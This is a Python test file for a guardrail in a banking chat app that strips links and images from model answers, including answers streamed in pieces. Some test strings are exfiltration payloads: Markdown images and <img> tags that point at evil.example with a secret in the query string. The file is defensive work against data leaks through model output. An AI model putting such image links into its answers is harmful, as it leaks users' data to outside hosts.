"""
Links in rendered output.

Chat answers and template answers are rendered as Markdown, and the profile
cards are HTML. A Markdown image or an <img> tag makes the reader's browser
fetch its URL with no click, which is a way to leak data; a link invites a
click. Nothing BankLens answers needs a URL, so they are removed — including
while an answer streams, where a link can arrive split across chunks.
"""

from __future__ import annotations

import pytest

from app.platform.guardrails import (
    IMAGE_REMOVED,
    LINK_REMOVED,
    LinkNeutraliser,
    neutralise_links,
)
from evals.redteam.cases import LINK_ATTACKS, LINK_BENIGN

URL_SHAPES = ("http://", "https://", "www.", "data:", "<img", "![")


@pytest.mark.parametrize("text", LINK_ATTACKS)
def test_attacks_come_out_without_a_url(text):
    out = neutralise_links(text)
    assert not any(shape in out.lower() for shape in URL_SHAPES), out


@pytest.mark.parametrize("text", LINK_BENIGN)
def test_ordinary_markdown_is_unchanged(text):
    assert neutralise_links(text) == text


def test_links_keep_their_text_and_images_become_a_marker():
    assert (
        neutralise_links("See [the FD page](https://x.example/fd).")
        == "See the FD page."
    )
    assert neutralise_links("![chart](https://x.example/c.png)") == IMAGE_REMOVED
    assert (
        neutralise_links("Go to https://x.example/a now") == f"Go to {LINK_REMOVED} now"
    )


STREAMED = [
    "Answer: ![pix](https://evil.example/?q=secret) then [click](http://x.y/z) "
    "and https://a.b/c end.\nNext line [Note] stays.",
    "Fine text with **bold**, (brackets), ₹1,20,000 and [a note].",
    "<img src=https://evil.example/a.gif> then ![a][r]\n\n[r]: https://evil.example/r",
]


@pytest.mark.parametrize("text", STREAMED)
def test_streaming_matches_the_whole_text_at_every_split(text):
    expected = neutralise_links(text)
    for i in range(len(text) + 1):
        for j in range(i, len(text) + 1, 5):
            stream = LinkNeutraliser()
            pieces = [
                stream.feed(text[:i]),
                stream.feed(text[i:j]),
                stream.feed(text[j:]),
            ]
            pieces.append(stream.flush())
            assert "".join(pieces) == expected, (i, j)
            # No released piece ever carries part of a URL.
            assert not any("://" in p for p in pieces), (i, j)


def test_streaming_releases_one_character_at_a_time_safely():
    text = STREAMED[0]
    stream = LinkNeutraliser()
    out = "".join(stream.feed(c) for c in text) + stream.flush()
    assert out == neutralise_links(text)


def test_held_text_is_bounded():
    stream = LinkNeutraliser()
    released = stream.feed("[" + "x" * 3000)  # an opener that never closes
    assert len(released) > 0


def test_profile_card_text_is_escaped_and_link_free():
    from app.ui.components import _model_text

    assert _model_text("<b>Saver</b>") == "&lt;b&gt;Saver&lt;/b&gt;"
    out = _model_text(
        'Good saver <img src="https://evil.example/x.gif">\n\n![a](https://e.example/a)'
    )
    assert "<" not in out and "https://" not in out
    assert out.count(IMAGE_REMOVED) == 2
